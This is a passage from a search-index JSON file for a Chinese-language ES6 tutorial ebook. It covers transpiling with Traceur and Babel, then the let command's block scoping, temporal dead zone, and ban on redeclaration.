{};\n});\n&lt;/script&gt;\n</code></pre>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#_6","title":"\u547d\u4ee4\u884c\u8f6c\u6362","text":"<p>\u4f5c\u4e3a\u547d\u4ee4\u884c\u5de5\u5177\u4f7f\u7528\u65f6\uff0cTraceur \u662f\u4e00\u4e2a Node \u7684\u6a21\u5757\uff0c\u9996\u5148\u9700\u8981\u7528 npm \u5b89\u88c5\u3002</p> <pre><code>$ npm install -g traceur\n</code></pre> <p>\u5b89\u88c5\u6210\u529f\u540e\uff0c\u5c31\u53ef\u4ee5\u5728\u547d\u4ee4\u884c\u4e0b\u4f7f\u7528 Traceur \u4e86\u3002</p> <p>Traceur \u76f4\u63a5\u8fd0\u884c ES6 \u811a\u672c\u6587\u4ef6\uff0c\u4f1a\u5728\u6807\u51c6\u8f93\u51fa\u663e\u793a\u8fd0\u884c\u7ed3\u679c\uff0c\u4ee5\u524d\u9762\u7684<code>calc.js</code>\u4e3a\u4f8b\u3002</p> <pre><code>$ traceur calc.js\nCalc constructor\n9\n</code></pre> <p>\u5982\u679c\u8981\u5c06 ES6 \u811a\u672c\u8f6c\u4e3a ES5 \u4fdd\u5b58\uff0c\u8981\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>$ traceur --script calc.es6.js --out calc.es5.js\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>--script</code>\u9009\u9879\u8868\u793a\u6307\u5b9a\u8f93\u5165\u6587\u4ef6\uff0c<code>--out</code>\u9009\u9879\u8868\u793a\u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u3002</p> <p>\u4e3a\u4e86\u9632\u6b62\u6709\u4e9b\u7279\u6027\u7f16\u8bd1\u4e0d\u6210\u529f\uff0c\u6700\u597d\u52a0\u4e0a<code>--experimental</code>\u9009\u9879\u3002</p> <pre><code>$ traceur --script calc.es6.js --out calc.es5.js --experimental\n</code></pre> <p>\u547d\u4ee4\u884c\u4e0b\u8f6c\u6362\u751f\u6210\u7684\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u653e\u5230\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#node","title":"Node \u73af\u5883\u7684\u7528\u6cd5","text":"<p>Traceur \u7684 Node \u7528\u6cd5\u5982\u4e0b\uff08\u5047\u5b9a\u5df2\u5b89\u88c5<code>traceur</code>\u6a21\u5757\uff09\u3002</p> <pre><code>var traceur = require('traceur');\nvar fs = require('fs');\n\n// \u5c06 ES6 \u811a\u672c\u8f6c\u4e3a\u5b57\u7b26\u4e32\nvar contents = fs.readFileSync('es6-file.js').toString();\n\nvar result = traceur.compile(contents, {\n  filename: 'es6-file.js',\n  sourceMap: true,\n  // \u5176\u4ed6\u8bbe\u7f6e\n  modules: 'commonjs'\n});\n\nif (result.error)\n  throw result.error;\n\n// result \u5bf9\u8c61\u7684 js \u5c5e\u6027\u5c31\u662f\u8f6c\u6362\u540e\u7684 ES5 \u4ee3\u7801\nfs.writeFileSync('out.js', result.js);\n// sourceMap \u5c5e\u6027\u5bf9\u5e94 map \u6587\u4ef6\nfs.writeFileSync('out.js.map', result.sourceMap);\n</code></pre> <pre><code># babel \u8f6c\u7801\nnpm install --save-dev @babel/core\nnpm install --save-dev @babel/preset-env\nnpm install --save-dev @babel/preset-react\n\n# .babelrc\n# {\n#   \"preset\": [\n#     \"babel/env\",\n#     \"babel/preset-react\"\n#   ],\n#   \"plugins\": []\n# }\n\n# \u672c\u5730\u7f16\u8bd1\nnpm install --save-dev @babel/cli\nnpx babel index.js --out-file bundle.js\nnpx babel index.js -o bundle.jss\nnpx babel src -out-dir dist\nnpx babel src -d dist\n\n# node \u73af\u5883\u5f00\u53d1\n</code></pre>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/","title":"let \u548c const \u547d\u4ee4","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 21005  \u9605\u8bfb43\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#let","title":"let","text":""},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_1","title":"\u7528\u6cd5","text":"<p>ES6 \u65b0\u589e\u4e86<code>let</code>\u547d\u4ee4\uff0c\u7528\u6765\u58f0\u660e\u53d8\u91cf\u3002\u5b83\u7684\u7528\u6cd5\u7c7b\u4f3c\u4e8e<code>var</code>\uff0c\u4f46\u662f\u6240\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u53ea\u5728<code>let</code>\u547d\u4ee4\u6240\u5728\u7684\u4ee3\u7801\u5757\u5185\u6709\u6548\uff08let\u58f0\u660e\u7684\u53d8\u91cf\u5177\u6709\u5757\u7ea7\u4f5c\u7528\u57df\uff0cvar\u6ca1\u6709\u5757\u7ea7\u4f5c\u7528\u57df\uff09\u3002</p> <pre><code>{\n  let a = 10;\n  var b = 1;\n}\n\na // ReferenceError: a is not defined.\nb // 1\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728\u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u5206\u522b\u7528<code>let</code>\u548c<code>var</code>\u58f0\u660e\u4e86\u4e24\u4e2a\u53d8\u91cf\u3002\u7136\u540e\u5728\u4ee3\u7801\u5757\u4e4b\u5916\u8c03\u7528\u8fd9\u4e24\u4e2a\u53d8\u91cf\uff0c\u7ed3\u679c<code>let</code>\u58f0\u660e\u7684\u53d8\u91cf\u62a5\u9519\uff0c<code>var</code>\u58f0\u660e\u7684\u53d8\u91cf\u8fd4\u56de\u4e86\u6b63\u786e\u7684\u503c\u3002\u8fd9\u8868\u660e\uff0c<code>let</code>\u58f0\u660e\u7684\u53d8\u91cf\u53ea\u5728\u5b83\u6240\u5728\u7684\u4ee3\u7801\u5757\u6709\u6548\u3002</p> <p><code>for</code>\u5faa\u73af\u7684\u8ba1\u6570\u5668\uff0c\u5c31\u5f88\u5408\u9002\u4f7f\u7528<code>let</code>\u547d\u4ee4\u3002</p> <pre><code>for (let i = 0; i &lt; 10; i++) {\n  // ...\u8ba1\u6570\u5668i\u53ea\u5728for\u5faa\u73af\u4f53\u5185\u6709\u6548\uff0c\u5728\u5faa\u73af\u4f53\u5916\u5f15\u7528\u5c31\u4f1a\u62a5\u9519\u3002\n}\n</code></pre> <p>\u4e0b\u9762\u7684\u4ee3\u7801\u5982\u679c\u4f7f\u7528<code>var</code>\uff0c\u6700\u540e\u8f93\u51fa\u7684\u662f<code>10</code>\u3002</p> <pre><code>var a = [];\nfor (var i = 0; i &lt; 10; i++) {\n  a[i] = function () {\n    console.log(i);\n  };\n}\na[6](); // 10\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>i</code>\u662f<code>var</code>\u547d\u4ee4\u58f0\u660e\u7684\uff0c\u5728\u5168\u5c40\u8303\u56f4\u5185\u90fd\u6709\u6548\uff0c\u6240\u4ee5\u5168\u5c40\u53ea\u6709\u4e00\u4e2a\u53d8\u91cf<code>i</code>\u3002\u6bcf\u4e00\u6b21\u5faa\u73af\uff0c\u53d8\u91cf<code>i</code>\u7684\u503c\u90fd\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u800c\u5faa\u73af\u5185\u88ab\u8d4b\u7ed9\u6570\u7ec4<code>a</code>\u7684\u51fd\u6570\u5185\u90e8\u7684<code>console.log(i)</code>\uff0c\u91cc\u9762\u7684<code>i</code>\u6307\u5411\u7684\u5c31\u662f\u5168\u5c40\u7684<code>i</code>\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6240\u6709\u6570\u7ec4<code>a</code>\u7684\u6210\u5458\u91cc\u9762\u7684<code>i</code>\uff0c\u6307\u5411\u7684\u90fd\u662f\u540c\u4e00\u4e2a<code>i</code>\uff0c\u5bfc\u81f4\u8fd0\u884c\u65f6\u8f93\u51fa\u7684\u662f\u6700\u540e\u4e00\u8f6e\u7684<code>i</code>\u7684\u503c\uff0c\u4e5f\u5c31\u662f 10\u3002</p> <p>\u5982\u679c\u4f7f\u7528<code>let</code>\uff0c\u58f0\u660e\u7684\u53d8\u91cf\u4ec5\u5728\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u6709\u6548\uff0c\u6700\u540e\u8f93\u51fa\u7684\u662f 6\u3002</p> <pre><code>var a = [];\nfor (let i = 0; i &lt; 10; i++) {\n  a[i] = function () {\n    console.log(i);\n  };\n}\na[6](); // 6\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>i</code>\u662f<code>let</code>\u58f0\u660e\u7684\uff0c\u5f53\u524d\u7684<code>i</code>\u53ea\u5728\u672c\u8f6e\u5faa\u73af\u6709\u6548\uff0c\u6240\u4ee5\u6bcf\u4e00\u6b21\u5faa\u73af\u7684<code>i</code>\u5176\u5b9e\u90fd\u662f\u4e00\u4e2a\u65b0\u7684\u53d8\u91cf\uff0c\u6240\u4ee5\u6700\u540e\u8f93\u51fa\u7684\u662f<code>6</code>\u3002\u4f60\u53ef\u80fd\u4f1a\u95ee\uff0c\u5982\u679c\u6bcf\u4e00\u8f6e\u5faa\u73af\u7684\u53d8\u91cf<code>i</code>\u90fd\u662f\u91cd\u65b0\u58f0\u660e\u7684\uff0c\u90a3\u5b83\u600e\u4e48\u77e5\u9053\u4e0a\u4e00\u8f6e\u5faa\u73af\u7684\u503c\uff0c\u4ece\u800c\u8ba1\u7b97\u51fa\u672c\u8f6e\u5faa\u73af\u7684\u503c\uff1f\u8fd9\u662f\u56e0\u4e3a JavaScript \u5f15\u64ce\u5185\u90e8\u4f1a\u8bb0\u4f4f\u4e0a\u4e00\u8f6e\u5faa\u73af\u7684\u503c\uff0c\u521d\u59cb\u5316\u672c\u8f6e\u7684\u53d8\u91cf<code>i</code>\u65f6\uff0c\u5c31\u5728\u4e0a\u4e00\u8f6e\u5faa\u73af\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u8ba1\u7b97\u3002</p> <p>\u53e6\u5916\uff0c<code>for</code>\u5faa\u73af\u8fd8\u6709\u4e00\u4e2a\u7279\u522b\u4e4b\u5904\uff0c\u5c31\u662f\u8bbe\u7f6e\u5faa\u73af\u53d8\u91cf\u7684\u90a3\u90e8\u5206\u662f\u4e00\u4e2a\u7236\u4f5c\u7528\u57df\uff0c\u800c\u5faa\u73af\u4f53\u5185\u90e8\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u5b50\u4f5c\u7528\u57df\u3002\u4ee3\u7801\u8f93\u51fa\u4e86 3 \u6b21<code>abc</code>\u3002\u8fd9\u8868\u660e\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf<code>i</code>\u4e0e\u5faa\u73af\u53d8\u91cf<code>i</code>\u4e0d\u5728\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\uff0c\u6709\u5404\u81ea\u5355\u72ec\u7684\u4f5c\u7528\u57df\u3002</p> <pre><code>for (let i = 0; i &lt; 3; i++) {\n  let i = 'abc';\n  console.log(i);\n}\n// abc\n// abc\n// abc\n</code></pre>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_2","title":"\u4e0d\u5b58\u5728\u53d8\u91cf\u63d0\u5347","text":"<p><code>var</code>\u547d\u4ee4\u4f1a\u53d1\u751f\u201c\u53d8\u91cf\u63d0\u5347\u201d\u73b0\u8c61\uff0c\u5373\u53d8\u91cf\u53ef\u4ee5\u5728\u58f0\u660e\u4e4b\u524d\u4f7f\u7528\uff0c\u503c\u4e3a<code>undefined</code>\u3002\u8fd9\u79cd\u73b0\u8c61\u591a\u591a\u5c11\u5c11\u662f\u6709\u4e9b\u5947\u602a\u7684\uff0c\u6309\u7167\u4e00\u822c\u7684\u903b\u8f91\uff0c\u53d8\u91cf\u5e94\u8be5\u5728\u58f0\u660e\u8bed\u53e5\u4e4b\u540e\u624d\u53ef\u4ee5\u4f7f\u7528\u3002</p> <p>\u4e3a\u4e86\u7ea0\u6b63\u8fd9\u79cd\u73b0\u8c61\uff0c<code>let</code>\u547d\u4ee4\u6539\u53d8\u4e86\u8bed\u6cd5\u884c\u4e3a\uff0c\u5b83\u6240\u58f0\u660e\u7684\u53d8\u91cf\u4e00\u5b9a\u8981\u5728\u58f0\u660e\u540e\u4f7f\u7528\uff0c\u5426\u5219\u62a5\u9519\u3002</p> <pre><code>// var \u7684\u60c5\u51b5\nconsole.log(foo); // \u8f93\u51faundefined\nvar foo = 2;\n\n// let \u7684\u60c5\u51b5\nconsole.log(bar); // \u62a5\u9519ReferenceError\nlet bar = 2;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>foo</code>\u7528<code>var</code>\u547d\u4ee4\u58f0\u660e\uff0c\u4f1a\u53d1\u751f\u53d8\u91cf\u63d0\u5347\uff0c\u5373\u811a\u672c\u5f00\u59cb\u8fd0\u884c\u65f6\uff0c\u53d8\u91cf<code>foo</code>\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u4f46\u662f\u6ca1\u6709\u503c\uff0c\u6240\u4ee5\u4f1a\u8f93\u51fa<code>undefined</code>\u3002\u53d8\u91cf<code>bar</code>\u7528<code>let</code>\u547d\u4ee4\u58f0\u660e\uff0c\u4e0d\u4f1a\u53d1\u751f\u53d8\u91cf\u63d0\u5347\u3002\u8fd9\u8868\u793a\u5728\u58f0\u660e\u5b83\u4e4b\u524d\uff0c\u53d8\u91cf<code>bar</code>\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u8fd9\u65f6\u5982\u679c\u7528\u5230\u5b83\uff0c\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002</p>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_3","title":"\u6682\u65f6\u6027\u6b7b\u533a","text":"<p>\u53ea\u8981\u5757\u7ea7\u4f5c\u7528\u57df\u5185\u5b58\u5728<code>let</code>\u547d\u4ee4\uff0c\u5b83\u6240\u58f0\u660e\u7684\u53d8\u91cf\u5c31\u201c\u7ed1\u5b9a\u201d\uff08binding\uff09\u8fd9\u4e2a\u533a\u57df\uff0c\u4e0d\u518d\u53d7\u5916\u90e8\u7684\u5f71\u54cd\u3002</p> <pre><code>var tmp = 123;\n\nif (true) {\n  tmp = 'abc'; // ReferenceError\n  let tmp;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b58\u5728\u5168\u5c40\u53d8\u91cf<code>tmp</code>\uff0c\u4f46\u662f\u5757\u7ea7\u4f5c\u7528\u57df\u5185<code>let</code>\u53c8\u58f0\u660e\u4e86\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf<code>tmp</code>\uff0c\u5bfc\u81f4\u540e\u8005\u7ed1\u5b9a\u8fd9\u4e2a\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u6240\u4ee5\u5728<code>let</code>\u58f0\u660e\u53d8\u91cf\u524d\uff0c\u5bf9<code>tmp</code>\u8d4b\u503c\u4f1a\u62a5\u9519\u3002</p> <p>ES6 \u660e\u786e\u89c4\u5b9a\uff0c\u5982\u679c\u533a\u5757\u4e2d\u5b58\u5728<code>let</code>\u548c<code>const</code>\u547d\u4ee4\uff0c\u8fd9\u4e2a\u533a\u5757\u5bf9\u8fd9\u4e9b\u547d\u4ee4\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u4ece\u4e00\u5f00\u59cb\u5c31\u5f62\u6210\u4e86\u5c01\u95ed\u4f5c\u7528\u57df\u3002\u51e1\u662f\u5728\u58f0\u660e\u4e4b\u524d\u5c31\u4f7f\u7528\u8fd9\u4e9b\u53d8\u91cf\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u603b\u4e4b\uff0c\u5728\u4ee3\u7801\u5757\u5185\uff0c\u4f7f\u7528<code>let</code>\u547d\u4ee4\u58f0\u660e\u53d8\u91cf\u4e4b\u524d\uff0c\u8be5\u53d8\u91cf\u90fd\u662f\u4e0d\u53ef\u7528\u7684\u3002\u8fd9\u5728\u8bed\u6cd5\u4e0a\uff0c\u79f0\u4e3a\u201c\u6682\u65f6\u6027\u6b7b\u533a\u201d\uff08temporal dead zone\uff0c\u7b80\u79f0 TDZ\uff09\u3002</p> <pre><code>if (true) {\n  // TDZ\u5f00\u59cb\n  tmp = 'abc'; // ReferenceError\n  console.log(tmp); // ReferenceError\n\n  let tmp; // TDZ\u7ed3\u675f\n  console.log(tmp); // undefined\n\n  tmp = 123;\n  console.log(tmp); // 123\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5728<code>let</code>\u547d\u4ee4\u58f0\u660e\u53d8\u91cf<code>tmp</code>\u4e4b\u524d\uff0c\u90fd\u5c5e\u4e8e\u53d8\u91cf<code>tmp</code>\u7684\u201c\u6b7b\u533a\u201d\u3002</p> <p>\u201c\u6682\u65f6\u6027\u6b7b\u533a\u201d\u4e5f\u610f\u5473\u7740<code>typeof</code>\u4e0d\u518d\u662f\u4e00\u4e2a\u767e\u5206\u4e4b\u767e\u5b89\u5168\u7684\u64cd\u4f5c\u3002</p> <pre><code>typeof x; // ReferenceError\nlet x;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>x</code>\u4f7f\u7528<code>let</code>\u547d\u4ee4\u58f0\u660e\uff0c\u6240\u4ee5\u5728\u58f0\u660e\u4e4b\u524d\uff0c\u90fd\u5c5e\u4e8e<code>x</code>\u7684\u201c\u6b7b\u533a\u201d\uff0c\u53ea\u8981\u7528\u5230\u8be5\u53d8\u91cf\u5c31\u4f1a\u62a5\u9519\u3002\u56e0\u6b64\uff0c<code>typeof</code>\u8fd0\u884c\u65f6\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a<code>ReferenceError</code>\u3002</p> <p>\u4f5c\u4e3a\u6bd4\u8f83\uff0c\u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u6839\u672c\u6ca1\u6709\u88ab\u58f0\u660e\uff0c\u4f7f\u7528<code>typeof</code>\u53cd\u800c\u4e0d\u4f1a\u62a5\u9519\u3002</p> <pre><code>typeof undeclared_variable // \"undefined\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>undeclared_variable</code>\u662f\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u53d8\u91cf\u540d\uff0c\u7ed3\u679c\u8fd4\u56de\u201cundefined\u201d\u3002\u6240\u4ee5\uff0c\u5728\u6ca1\u6709<code>let</code>\u4e4b\u524d\uff0c<code>typeof</code>\u8fd0\u7b97\u7b26\u662f\u767e\u5206\u4e4b\u767e\u5b89\u5168\u7684\uff0c\u6c38\u8fdc\u4e0d\u4f1a\u62a5\u9519\u3002\u73b0\u5728\u8fd9\u4e00\u70b9\u4e0d\u6210\u7acb\u4e86\u3002\u8fd9\u6837\u7684\u8bbe\u8ba1\u662f\u4e3a\u4e86\u8ba9\u5927\u5bb6\u517b\u6210\u826f\u597d\u7684\u7f16\u7a0b\u4e60\u60ef\uff0c\u53d8\u91cf\u4e00\u5b9a\u8981\u5728\u58f0\u660e\u4e4b\u540e\u4f7f\u7528\uff0c\u5426\u5219\u5c31\u62a5\u9519\u3002</p> <p>\u6709\u4e9b\u201c\u6b7b\u533a\u201d\u6bd4\u8f83\u9690\u853d\uff0c\u4e0d\u592a\u5bb9\u6613\u53d1\u73b0\u3002</p> <pre><code>function bar(x = y, y = 2) {\n  return [x, y];\n}\n\nbar(); // \u62a5\u9519\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8c03\u7528<code>bar</code>\u51fd\u6570\u4e4b\u6240\u4ee5\u62a5\u9519\uff08\u67d0\u4e9b\u5b9e\u73b0\u53ef\u80fd\u4e0d\u62a5\u9519\uff09\uff0c\u662f\u56e0\u4e3a\u53c2\u6570<code>x</code>\u9ed8\u8ba4\u503c\u7b49\u4e8e\u53e6\u4e00\u4e2a\u53c2\u6570<code>y</code>\uff0c\u800c\u6b64\u65f6<code>y</code>\u8fd8\u6ca1\u6709\u58f0\u660e\uff0c\u5c5e\u4e8e\u201c\u6b7b\u533a\u201d\u3002\u5982\u679c<code>y</code>\u7684\u9ed8\u8ba4\u503c\u662f<code>x</code>\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6b64\u65f6<code>x</code>\u5df2\u7ecf\u58f0\u660e\u4e86\u3002</p> <pre><code>function bar(x = 2, y = x) {\n  return [x, y];\n}\nbar(); // [2, 2]\n</code></pre> <p>\u53e6\u5916\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u4e5f\u4f1a\u62a5\u9519\uff0c\u4e0e<code>var</code>\u7684\u884c\u4e3a\u4e0d\u540c\u3002</p> <pre><code>// \u4e0d\u62a5\u9519\nvar x = x;\n\n// \u62a5\u9519\nlet x = x;\n// ReferenceError: x is not defined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u62a5\u9519\uff0c\u4e5f\u662f\u56e0\u4e3a\u6682\u65f6\u6027\u6b7b\u533a\u3002\u4f7f\u7528<code>let</code>\u58f0\u660e\u53d8\u91cf\u65f6\uff0c\u53ea\u8981\u53d8\u91cf\u5728\u8fd8\u6ca1\u6709\u58f0\u660e\u5b8c\u6210\u524d\u4f7f\u7528\uff0c\u5c31\u4f1a\u62a5\u9519\u3002\u4e0a\u9762\u8fd9\u884c\u5c31\u5c5e\u4e8e\u8fd9\u4e2a\u60c5\u51b5\uff0c\u5728\u53d8\u91cf<code>x</code>\u7684\u58f0\u660e\u8bed\u53e5\u8fd8\u6ca1\u6709\u6267\u884c\u5b8c\u6210\u524d\uff0c\u5c31\u53bb\u53d6<code>x</code>\u7684\u503c\uff0c\u5bfc\u81f4\u62a5\u9519\u201dx \u672a\u5b9a\u4e49\u201c\u3002</p> <p>ES6 \u89c4\u5b9a\u6682\u65f6\u6027\u6b7b\u533a\u548c<code>let</code>\u3001<code>const</code>\u8bed\u53e5\u4e0d\u51fa\u73b0\u53d8\u91cf\u63d0\u5347\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u51cf\u5c11\u8fd0\u884c\u65f6\u9519\u8bef\uff0c\u9632\u6b62\u5728\u53d8\u91cf\u58f0\u660e\u524d\u5c31\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u8fd9\u6837\u7684\u9519\u8bef\u5728 ES5 \u662f\u5f88\u5e38\u89c1\u7684\uff0c\u73b0\u5728\u6709\u4e86\u8fd9\u79cd\u89c4\u5b9a\uff0c\u907f\u514d\u6b64\u7c7b\u9519\u8bef\u5c31\u5f88\u5bb9\u6613\u4e86\u3002</p> <p>\u603b\u4e4b\uff0c\u6682\u65f6\u6027\u6b7b\u533a\u7684\u672c\u8d28\u5c31\u662f\uff0c\u53ea\u8981\u4e00\u8fdb\u5165\u5f53\u524d\u4f5c\u7528\u57df\uff0c\u6240\u8981\u4f7f\u7528\u7684\u53d8\u91cf\u5c31\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u4f46\u662f\u4e0d\u53ef\u83b7\u53d6\uff0c\u53ea\u6709\u7b49\u5230\u58f0\u660e\u53d8\u91cf\u7684\u90a3\u4e00\u884c\u4ee3\u7801\u51fa\u73b0\uff0c\u624d\u53ef\u4ee5\u83b7\u53d6\u548c\u4f7f\u7528\u8be5\u53d8\u91cf\u3002</p>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_4","title":"\u4e0d\u5141\u8bb8\u91cd\u590d\u58f0\u660e","text":"<p><code>let</code>\u4e0d\u5141\u8bb8\u5728\u76f8\u540c\u4f5c\u7528\u57df\u5185\uff0c\u91cd\u590d\u58f0\u660e\u540c\u4e00\u4e2a\u53d8\u91cf\u3002</p> <pre><code>// \u62a5\u9519\nfunction func() {\n  let a = 10;\n  var a = 1;\n}\n\n// \u62a5\u9519\nfunction func() {\n  let a = 10;\n  let a = 1;\n}\n</code></pre> <p>\u56e0\u6b64\uff0c\u4e0d\u80fd\u5728\u51fd\u6570\u5185\u90e8\u91cd\u65b0\u58f0\u660e\u53c2\u6570\u3002</p> <pre><code>function func(arg) {\n  let arg;\n}\nfunc() // \u62a5\u9519\n\nfunction func(arg) {\n  {\n    let arg;\n  }\n}\nfunc() // \u4e0d\u62a5\u9519\n</code></pre>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_5","title":"\u5757\u7ea7\u4f5c\u7528\u57df","text":""},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#_6","title":"\u539f\u56e0","text":"<p>ES5 \u53ea\u6709\u5168\u5c40\u4f5c\u7528\u57df\u548c\u51fd\u6570\u4f5c\u7528\u57df\uff0c\u6ca1\u6709\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u8fd9\u5e26\u6765\u5f88\u591a\u4e0d\u5408\u7406\u7684\u573a\u666f\u3002</p> <p>\u7b2c\u4e00\u79cd\u573a\u666f\uff0c\u5185\u5c42\u53d8\u91cf\u53ef\u80fd\u4f1a\u8986\u76d6\u5916\u5c42\u53d8\u91cf\u3002</p> <pre><code>var tmp = new Date();\n\nfunction f() {\n  console.log(tmp);\n  if (false) {\n    var tmp = 'hello world';\n  }\n}\n\nf(); // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u539f\u610f\u662f\uff0c<code>if</code>\u4ee3\u7801\u5757\u7684\u5916\u90e8\u4f7f\u7528\u5916\u5c42\u7684<code>tmp</code>\u53d8\u91cf\uff0c\u5185\u90e8\u4f7f\u7528\u5185\u5c42\u7684<code>tmp</code>\u53d8\u91cf\u3002\u4f46\u662f\uff0c\u51fd\u6570<code>f</code>\u6267\u884c\u540e\uff0c\u8f93\u51fa\u7ed3\u679c\u4e3a<code>undefined</code>\uff0c\u539f\u56e0\u5728\u4e8e\u53d8\u91cf\u63d0\u5347\uff0c\u5bfc\u81f4\u5185\u5c42\u7684<code>tmp</code>\u53d8\u91cf\u8986\u76d6\u4e86\u5916\u5c42\u7684<code>tmp</code>\u53d8\u91cf\u3002</p> <p>\u7b2c\u4e8c\u79cd\u573a\u666f\uff0c\u7528\u6765\u8ba1\u6570\u7684\u5faa\u73af\u53d8\u91cf\u6cc4\u9732\u4e3a\u5168\u5c40\u53d8\u91cf\u3002</p> <pre><code>var s = 'hello';\n\nfor (var i = 0; i &lt; s.length; i++) {\n  console.log(s[i]);\n}\n\nconsole.log(i); // 5\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>i</code>\u53ea\u7528\u6765\u63a7\u5236\u5faa\u73af\uff0c\u4f46\u662f\u5faa\u73af\u7ed3\u675f\u540e\uff0c\u5b83\u5e76\u6ca1\u6709\u6d88\u5931\uff0c\u6cc4\u9732\u6210\u4e86\u5168\u5c40\u53d8\u91cf\u3002</p>"},{"location":"ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/#es6","title":"ES6 \u7684\u5757\u7ea7\u4f5c\u7528\u57df","text":"<p><code>let</code>\u5b9e\u9645\u4e0a\u4e3a JavaScript \u65b0\u589e\u4e86\u5757\u7ea7\u4f5c\u7528\u57df\u3002</p> <pre><code>function f1() {\n  let n = 5;\n  if (true) {\n    let n = 10;\n  }\n  console.log(n); // 5\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u51fd\u6570\u6709\u4e24\u4e2a\u4ee3\u7801\u5757\uff0c\u90fd\u58f0\u660e\u4e86\u53d8\u91cf<code>n</code>\uff0c\u8fd0\u884c\u540e\u8f93\u51fa 5\u3002\u8fd9\u8868\u793a\u5916\u5c42\u4ee3\u7801\u5757\u4e0d\u53d7\u5185\u5c42\u4ee3\u7801\u5757\u7684\u5f71\u54cd\u3002\u5982\u679c\u4e24\u6b21\u90fd\u4f7f\u7528<code>var</code>\u5b9a\u4e49\u53d8\u91cf<code>n</code>\uff0c\u6700\u540e\u8f93\u51fa\u7684\u503c\u624d\u662f 10\u3002</p> <p>ES6 \u5141\u8bb8\u5757\u7ea7\u4f5c\u7528\u57df\u7684\u4efb\u610f\u5d4c\u5957\u3002</p> <pre><code>{{{{\n  {let insane = 'Hello World'}\n  console.log(insane); // \u62a5\u9519\n}}}};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u4e86\u4e00\u4e2a\u4e94\u5c42\u7684\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u6bcf\u4e00\u5c42\u90fd\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u4f5c\u7528\u57df\u3002\u7b2c\u56db\u5c42\u4f5c\u7528\u57df\u65e0\u6cd5\u8bfb\u53d6\u7b2c\u4e94\u5c42\u4f5c\u7528\u57df\u7684\u5185\u90e8\u53d8\u91cf\u3002</p> <p>\u5185\u5c42\u4f5c\u7528\u57df\u53ef\u4ee5\u5b9a\u4e49\u5916\u5c42\u4f5c\u7528\u57df\u7684\u540c\u540d\u53d8\u91cf\u3002</p> <pre><code>{{{{\n  let insane = 'Hello World';\n  {let 